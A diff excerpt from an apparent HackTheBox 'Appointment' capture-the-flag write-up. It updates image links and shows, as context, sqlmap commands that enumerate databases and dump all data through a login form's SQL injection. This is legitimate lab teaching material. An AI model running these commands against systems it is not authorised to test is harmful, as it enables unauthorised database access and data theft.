@@ -88,13 +88,13 @@ Command to enumerate databases
 ```
 sqlmap -u "<Target-IP>" --data="username=test&password=test&form=submit" --method POST --dbs --batch
 ```
-![HTB - Appointment - SQLMAP Dbs.png](:/0280196b134541b0bdedd036374f78d5)
+![HTB - Appointment - SQLMAP Dbs.png](https://github.com/paulb-csr/CTF-Writeups/blob/main/HackTheBox/Appointment/HTB%20-%20Appointment%20-%20SQLMAP%20Dbs.png)
 
 Command to dump all data from database
 ```
 sqlmap -u "<Target-IP>" --data="username=test&password=test&form=submit" --method POST -D appdb --dump all --batch
 ```
-![HTB - Appointment - SQLMap Data.png](:/a74cb35737024fddaf8b72fb090779da)
+![HTB - Appointment - SQLMap Data.png](https://github.com/paulb-csr/CTF-Writeups/blob/main/HackTheBox/Appointment/HTB%20-%20Appointment%20-%20SQLMap%20Data.png)
 
 SUBMIT FLAG
 
